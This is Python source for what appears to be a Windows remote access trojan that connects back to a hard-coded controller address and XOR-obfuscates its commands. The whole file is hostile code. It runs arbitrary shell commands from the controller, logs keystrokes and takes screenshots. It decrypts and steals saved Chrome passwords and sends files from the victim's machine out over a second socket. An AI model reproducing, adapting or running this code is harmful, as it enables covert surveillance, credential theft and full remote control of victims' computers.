import socket
import platform
import subprocess
import os
from PIL import ImageGrab
import tempfile
import random
import shutil
import threading
from os import getenv 
import sqlite3
import win32crypt
from shutil import copyfile
from pynput.keyboard import Key, Listener

class EncryptionXor:

    #########################################################################
    # This class contains the method for encrypt data using XOR encryption  #
    #########################################################################

    def __init__(self):
        self.keyXor = '28zij6tTWYR8CMTvFM33g27NWido8Vox6T3lWGuHyLLGYMuHqV34fSDQ9hSWP6JM5XZz5YWWbgNrWANiy4pN3RoJnbUzUMENZ5U2dbNMEB4ynfl6Iolus98lZ0RPg1Cpj2SEUNlhY9MeToWNGoNYo1wXaMjEapo8ezzvdMovcaBfJdwXMv3JYDjQDh0rjeGpvLR2LlRVKBCKkxwSig16fRzU67cFzSJdscwZua118hSOROP1TRnowo7ObNRWtIrpFGxOFMYm4lqOoJ2pPzTSPZUaPApcD5wdrH4bvRq42Nh76TKINYD2bUzeAdSmoDeHBtPQr5mP7N2RRzpOQeywlEH92gMBDwF4rjF5Vv3IYyhvXE5I3tfSqxD7owG3H1z8inXDaR4uB4M0x1OXBjnE4Roi4AS5ibwnEfMRjiYkF4y70536m3OLN7QQwb08TIpKzx7CRyy8ee7kAR5K5QhvXyfFh3094Y6JRe8E9sn8LcQrpDUnM69rPrmy0I1aWcFPDEzlbnrth2KeoZRixs2CuDolHCCTGJbpUqoLBO3lnvGCAkk1DbxXMQ6kgQRQfd96LA2ILF0Mmx4GAdg3WMM26jZpCBniwgWfMtc9iUJqIvFqXNGeAFzH0tOTEUOvhzQtJjwOHuwyssPryrSHsYc11McdLYP0fRAoZG4giIbOxz03ldhXFcw7oBlRCfadjXxl6axeO93Tsj0Eoul5wRjvDI1vnpcuYytfKJ22FaErqryccZCPLMrRg8VO5EH3KQCx3TyK6rDkZMkqo6DJOjIjJGvkjBlho74ab4J3OXBhB6kduvVbZeAFdtN6PXdlVUve9DiUAGsoqWaMLwyOkJjB7FxzA4zFmGJoziO6KyCRMCk21epkQBUVwvHYfCYGKrDp7ArNd7SFEbpvSZvmUkTO8s7ANqBuFnfMU69EFYEoTRjebJ6WgwQWYo5zJkurhO7sECwUWCgePXoLX8SikQXBKrJPRrf7390XQuNCrqIWxcNODfwlVGSJCvkf47PE9Qmv'

    def convert(self, string):
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(string, self.keyXor)])

class Keylogger:
    def __init__(self):
        self.keylogs = ""
        self.validate = True
        self.dump = ""

    def startkl(self):
        with Listener(
                on_press=self.process_key_listein) as listener:
            self.report()
            listener.join()

    def report(self):

        if self.validate == True:
            print(self.keylogs)
            self.dump = self.dump + self.keylogs
            self.keylogs = ""
            timer = threading.Timer(5,self.report)
            timer.start()

        elif self.validate == False:
            return

    def process_key_listein(self,key):
        try:
            current_key = str(key.char)

        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "<ENTER>"
            elif key == key.backspace:
                current_key = "<BACKSPACE>"
            elif key == key.delete:
                current_key = "<DELETE>"
            elif key == key.alt:
                current_key = "<ALT>"
            elif key == key.ctrl:
                current_key = "<CTRL>"
            elif key == key.shift:
                current_key = "<SHIFT>"
            elif key == key.caps_lock:
                current_key = "<CAPSLOCK>"
            elif key == key.tab:
                current_key = "<TAB>"
            else:
                current_key = str(key)

        self.append_to_keylogs(current_key)

    def append_to_keylogs(self, string):
        if string == "<BACKSPACE>":
            self.keylogs = self.keylogs[:-1]
        else:
            self.keylogs = self.keylogs + string

class Operations:

    ############################################################
    # This class contains all operations the payload will use  #
    ############################################################

    def screenshot(self, socket):

        dirpath = tempfile.mkdtemp()
        valor = str(random.randrange(1, 999999))
        pwdImg = dirpath + "/" + valor + ".jpg"
        ImageGrab.grab().save(pwdImg, 'JPEG')
        try:
            f = open(pwdImg, 'rb')
            packetScreen = f.read(1024)
            while len(packetScreen) > 0:
                socket.send(packetScreen)
                packetScreen = f.read(1024)
            socket.send('DONE'.encode())
            f.close()
        except:
            socket.send('Print not taken'.encode())
            f.close()

        shutil.rmtree(dirpath)
    
    def transfer(self, socket, path):
        if os.path.exists(path):
            newFile = open(path, 'rb')
            packet = newFile.read(1024)
            print("Init Transfer")
            while len(packet) > 0:
                print("Loop")
                socket.send(packet)
                packet = newFile.read(1024)
            socket.send('DONE'.encode())
            print("While has finished")
            newFile.close()
            socket.close()
        else:
            socket.send('File not found'.encode())
            socket.close()

    def getChromePasswd(self):
        try:
            path = getenv("LOCALAPPDATA")+r"\Google\Chrome\User Data\Default\Login Data"
            path2 = getenv("LOCALAPPDATA")+r"\Google\Chrome\User Data\Default\Login2"
            copyfile(path, path2)

            conn = sqlite3.connect(path2)

            cursor = conn.cursor() #Create a Cursor object and call its execute() method to perform SQL commands like SELECT

            # SELECT column_name,column_name FROM table_name
            # SELECT action_url and username_value and password_value FROM table logins
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')

            passFile = open('ChromePasswd.txt', 'w')

            for raw in cursor.fetchall():

                password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  
                passFile.write("\nURL: " + raw[0])
                passFile.write("\nLogin: " + raw[1])
                passFile.write("\nPassword: " + password.decode())

            conn.close()
            print("sucesso, inciando thread")
            threading._start_new_thread(session.tConnect, (hostIP, tPort, 'chrome', 'ChromePasswd.txt'))
        except:
            return False
        
    def search(self, socket, command):
        listSearch = []
        tosearch = command[7:]
        path, ext = tosearch.split("*")
        valor = str(random.randrange(1, 999999))
        filename = "search" + valor + ".txt"

        for dirpath, _, files in os.walk(path):

            for file in files:
                
                if file.endswith(ext):
                    listSearch.append(os.path.join(dirpath, file))

        x = open(filename, 'w')
        for item in listSearch:
            x.writelines(item + "\n")
        x.close()
        print(filename)
        threading._start_new_thread(session.tConnect, (hostIP, tPort, 'search', filename))
        
class Session:
    def connect(self, clientIp, clientPort):
        s = socket.socket()
        s.connect((clientIp, clientPort))

        while True:
            command = xor.convert(s.recv(1024).decode())

            if 'osdetection' in command:
                try:
                    s.send(xor.convert(platform.platform()).encode())
                except:
                    s.send(xor.convert('Unknown').encode())

            elif 'gethostname' in command:
                try:
                    s.send(xor.convert(socket.gethostname()).encode())
                except:
                    s.send(xor.convert('Unknown').encode())

            elif 'screenshot' in command:
                task.screenshot(s)

            elif 'search' in command:
                threading._start_new_thread(task.search, (s, command))

            elif 'chrome' in command:
                if task.getChromePasswd():
                    task.transfer(s, 'ChromePasswd.txt')

            elif 'goto' in command:
                path = command.split("*")
                try:
                    os.chdir(path[1])
                    s.send(xor.convert('[+] CWD is ' + os.getcwd()).encode())
                except Exception as e:
                    s.send(xor.convert(('[-] ' + str(e))).encode())

            elif 'logging' in command:
                _,c2 = command.split("*")
                if c2 == 'start':
                    try:
                        kloginstance.validate = True
                        threading._start_new_thread(kloginstance.startkl, ())
                        s.send(xor.convert('Keylogging proccess started').encode())
                    except Exception as i:
                        print(i)
                        pass
                elif c2 == 'dump':
                    print("Entrei no dump")
                    dumpString = kloginstance.dump
                    s.send(xor.convert(dumpString).encode())
                    kloginstance.dump = ""
                    dumpString = ""
                elif c2 == 'stop':
                    kloginstance.validate = False
                    s.send(xor.convert('keylogging Stoped').encode())
                
                else:
                    s.send(xor.convert('Syntax Error, Usage: logging*<start/dump/stop>').encode())

            elif 'grab' in command:
                inputCommand = command.split("*")
                threading._start_new_thread(session.tConnect, (hostIP, tPort, 'transfer', inputCommand[1]))
                
            else:
                print(command)
                CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(xor.convert(CMD.stdout.read().decode(errors="ignore")).encode())
                s.send(xor.convert(CMD.stderr.read().decode(errors="ignore")).encode())

    def tConnect(self, clientIp, clientPort, operation, name):
        t = socket.socket()
        t.connect((clientIp, clientPort))
        task.transfer(t, name)
        t.close()
        os.remove(name) 

task = Operations()
session = Session()
xor = EncryptionXor()
kloginstance = Keylogger()


hostIP = '192.168.1.8'
mainPort = 4545
tPort = 8889

session.connect(hostIP, mainPort)